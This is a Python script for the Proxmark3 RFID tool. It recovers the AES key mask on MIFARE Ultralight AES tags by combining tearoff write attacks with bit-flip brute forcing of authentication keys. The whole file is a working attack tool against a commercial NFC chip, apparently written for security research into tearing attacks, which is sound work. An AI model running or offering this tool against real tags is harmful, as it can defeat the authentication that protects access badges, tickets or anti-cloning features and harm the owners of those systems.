#!/usr/bin/env -S uv run --with pycryptodome pm3 -y

"""Recover the mask used in Ultralight AES authentication."""

# Compared to recover_mask_fast, this one does not require the new aesauth/aeschk pm3 commands

import sys
import argparse
import time
import pm3

# not fully tested:
# - using extra_keys at best


total_auth = 0


def console_debug(p, command, capture=True, debug=False):
    """Print debug messages to the console if debugging is enabled."""
    if debug:
        print(command)
        sys.stdout.flush()
    p.console(command, capture=capture)


def hamming_weight(n):
    """Compute the Hamming weight (number of set bits) of an integer."""
    return bin(n).count('1')


def hamming_distance(n, m):
    """Compute the Hamming distance between two integers."""
    return bin(n ^ m).count('1')


def auth(p, key, block):
    """Authenticate with the given key and block."""
    global total_auth
    total_auth += 1
    if block == 48:
        console_debug(p, f'hf mfu aesauth -i 0 --key 000000000000000000000000{key:08x}', debug=debug)
    elif block == 49:
        console_debug(p, f'hf mfu aesauth -i 0 --key 0000000000000000{key:08x}00000000', debug=debug)
    elif block == 50:
        console_debug(p, f'hf mfu aesauth -i 0 --key 00000000{key:08x}0000000000000000', debug=debug)
    elif block == 51:
        console_debug(p, f'hf mfu aesauth -i 0 --key {key:08x}000000000000000000000000', debug=debug)
    else:
        raise ValueError(f"Unsupported block number: {block}")
    for line in p.grabbed_output.split('\n'):
        if "Authentication" in line:
            return "ok" in line


def bruteforce_key(p, key, block, fast_retries=5, slow_retries=3, bitflips=[1, 2]):
    """Bruteforce the key by flipping bits and checking authentication."""
    if 1 in bitflips:
        # Try all keys with one bit flipped to 1
        sys.stdout.flush()
        for _ in range(fast_retries):
            for i in range(32):
                test_key = key ^ (1 << i)
                if auth(p, test_key, block):
                    print(f"Auth succeeded with key: {test_key:08X} (1 bit flipped at position {i})")
                    sys.stdout.flush()
                    return test_key
    if 2 in bitflips:
        # Try all keys with two bits flipped to 1
        for _ in range(slow_retries):
            for i in range(32):
                for j in range(i + 1, 32):
                    test_key = key ^ (1 << i) ^ (1 << j)
                    if auth(p, test_key, block):
                        print(f"Auth succeeded with key: {test_key:08X} (2 bits flipped at positions {i}, {j})")
                        sys.stdout.flush()
                        return test_key
    return None


def insert_key(keys, newkey, initkey):
    """Insert a new key into the list of keys, ensuring no duplicates."""
    if newkey not in keys:
        keys.insert(0, newkey)
        keys.sort(key=lambda k: hamming_distance(k, initkey), reverse=True)
    bigflip = 0
    for key in keys:
        bigflip |= key ^ initkey
    bigkey = initkey ^ bigflip
    if bigkey not in keys:
        keys.insert(0, bigkey)
    return keys


if __name__ == "__main__":
    p = pm3.pm3()

    parser = argparse.ArgumentParser(description="Recover the mask used in Ultralight AES authentication")
    parser.add_argument('--init', type=lambda x: int(x, 0), default=0x00000000, help='Initial key block value (hex)')
    parser.add_argument('--final', type=lambda x: int(x, 0), default=0x00000000, help='Final key block value (hex)')
    parser.add_argument('--block', type=lambda x: int(x, 0), required=True,
                        help='Block number (hex or int) DataProt:48-51 UIDRetr:52-55')
    parser.add_argument('--tear1', type=int, default=275, help='First tearoff value (ms)')
    parser.add_argument('--tear2', type=int, default=235, help='Second tearoff value (ms)')
    parser.add_argument('--max_hd_diff', type=int, default=2, help='Maximum Hamming distance difference')
    parser.add_argument('--fast_retries', type=int, default=10, help='Number of fast retries')
    parser.add_argument('--slow_retries', type=int, default=3, help='Number of slow retries')
    parser.add_argument('--debug', action='store_true', help='Enable debug output')
    args = parser.parse_args()

    init = args.init
    final = args.final
    block = args.block
    tear1 = args.tear1
    tear2 = args.tear2
    max_hd_diff = args.max_hd_diff
    fast_retries = args.fast_retries
    slow_retries = args.slow_retries
    debug = args.debug

    initkey = int.from_bytes(init.to_bytes(4, 'big')[::-1], 'big')
    ntear2 = 0
    max_hd = 0
    keys = []
    start_time = time.time()
    console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
    for i in range(48, 52):
        console_debug(p, f'hf 14a raw -sc a2{i:02x}00000000', capture=False, debug=debug)
    console_debug(p, f'hf 14a raw -sc a2{block:02x}{init:08x}', capture=False, debug=debug)
    print(f"Testing with initial tearoff value: {tear1} ms")
    console_debug(p, f'hw tearoff --delay {tear1}', capture=False, debug=debug)
    console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
    console_debug(p, f'hf 14a raw -sc a2{block:02x}{final:08x}', capture=False, debug=debug)
    key = initkey
    assert auth(p, key, block)
    console_debug(p, f'hw tearoff --delay {tear2}', capture=False, debug=debug)

    keys.insert(0, key)
    # Drop the already known intermediate keys here to accelerate the search when repeating on the same segment
    extrakeys = [][::-1]

    while True:
        print("Keys:", '['+' '.join([f"0x{k:08X}," for k in keys]) + ']')
        print(f"Tears: "f"1*{tear1}ms + {ntear2}*{tear2}ms")
        print(f"Max HD: {max(hamming_distance(k, initkey) for k in keys)}")
        sys.stdout.flush()
        nsame = 0
        while auth(p, key, block):
            print(f"Testing with extra tearoff value: {tear2} ms")
            sys.stdout.flush()
            console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
            console_debug(p, f'hf 14a raw -sc a2{block:02x}{final:08x}', capture=False, debug=debug)
            ntear2 += 1
            nsame += 1
            if nsame >= 100:
                print(f"Stopping after {nsame} successful authentications with the same key.")
                print("Keys:", '['+' '.join([f"0x{k:08X}," for k in keys]) + ']')
                print(f"Tears: "f"1*{tear1}ms + {ntear2}*{tear2}ms (last {nsame} tears just for confirmation)")
                print(f'Block {block:2} (0x{block:02x}) segment key mask probably found: '
                      f'{keys[0]:08X} (mask block value: {int.from_bytes(keys[0].to_bytes(4, 'big')[::-1], 'big'):08X})'
                      f' with HD={hamming_distance(keys[0], initkey):2d}')
                print(f"Total authentications: {total_auth}")
                current_time = time.time()
                elapsed_time = current_time - start_time
                minutes, seconds = divmod(elapsed_time, 60)
                print(f"Time spent since start: {int(minutes)} minutes {seconds:.2f} seconds")
                sys.stdout.flush()
                exit(0)

        newkey = None
        for key in keys:
            if abs(max_hd - hamming_distance(key, initkey)) > max_hd_diff:
                continue
            print(f"Trying known keys: {key:08X}")
            sys.stdout.flush()
            for _ in range(fast_retries):
                if auth(p, key, block):
                    newkey = key
                    break
            if newkey is not None:
                break
        else:
            for key in extrakeys:
                if key not in keys:
                    if abs(max_hd - hamming_distance(key, initkey)) > max_hd_diff:
                        continue
                    print(f"Trying extra key: {key:08X}")
                    sys.stdout.flush()
                    for _ in range(fast_retries):
                        if auth(p, key, block):
                            newkey = key
                            break
                    if newkey is not None:
                        break
            else:
                for key in keys:
                    if abs(max_hd - hamming_distance(key, initkey)) > max_hd_diff:
                        continue
                    print(f"Trying 1 bitflip from key: {key:08X}")
                    sys.stdout.flush()
                    newkey = bruteforce_key(p, key, block, fast_retries, slow_retries, bitflips=[1])
                    if newkey is not None:
                        break
                else:
                    for key in keys:
                        if abs(max_hd - hamming_distance(key, initkey)) > max_hd_diff:
                            continue
                        print(f"Trying 2 bitflips from key: {key:08X}")
                        sys.stdout.flush()
                        newkey = bruteforce_key(p, key, block, fast_retries, slow_retries, bitflips=[2])
                        if newkey is not None:
                            break
        assert newkey is not None
        if newkey not in keys:
            keys = insert_key(keys, newkey, initkey=initkey)
            max_hd = max(hamming_distance(k, initkey) for k in keys)
            print(f"New key found: {newkey:08X} with HD={hamming_distance(newkey, initkey):02d}, "
                  f"max HD in keys: {max_hd:02d}")
            sys.stdout.flush()
        key = max(keys, key=lambda k: hamming_distance(k, initkey))
